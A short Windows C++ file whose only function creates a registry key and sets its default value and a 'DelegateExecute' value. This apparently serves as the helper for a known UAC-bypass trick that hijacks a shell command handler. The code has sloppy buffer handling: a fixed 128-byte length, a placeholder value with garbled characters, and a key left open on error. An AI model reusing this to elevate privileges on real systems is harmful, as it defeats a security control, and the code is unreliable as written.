#include <windows.h>
#include <iostream>
#include "def.h"

// Create Registry key and set value
bool CreateRegistryKeySetValue(HKEY parentKey, LPCWSTR subKey, LPBYTE keyVal) {
	//std::wstring fullPath = keyVal;
	HKEY phResult = NULL;
	DWORD dwDisposition = 0;

	// Create registry key
	DWORD isCreated = RegCreateKeyEx(
		parentKey,		// Registry key
		subKey,			// Registryu sub key
		0,
		NULL,			// User defined class
		REG_OPTION_NON_VOLATILE,	// Regirtru option
		KEY_ALL_ACCESS,	//Access privilege
		NULL,			// Security attribute
		&phResult,		// Handle to created registry key
		&dwDisposition	//Existence of key
	);
	if (isCreated != ERROR_SUCCESS) {
		return FALSE;
	}
	// Set registry value (default)
	DWORD isSetDefault = RegSetValueEx(
		phResult,
		NULL,
		0,
		REG_SZ,
		(LPCBYTE)keyVal,
		128
	);
	if (isSetDefault != ERROR_SUCCESS) {
		return FALSE;
	}
	// Set registry value (DelegateExecute)
	DWORD isSetDelegateExecute = RegSetValueEx(
		phResult,
		L"DelegateExecute",
		0,
		REG_SZ,
		//(LPCBYTE)keyVal,
		(LPBYTE)"huga‚ ‚ ‚ ",
		128
		//wcslen(keyVal) * sizeof(WCHAR)
	);
	if (isSetDelegateExecute != ERROR_SUCCESS) {
		return FALSE;
	}
	// Close registry key
	RegCloseKey(phResult);
	return TRUE;
}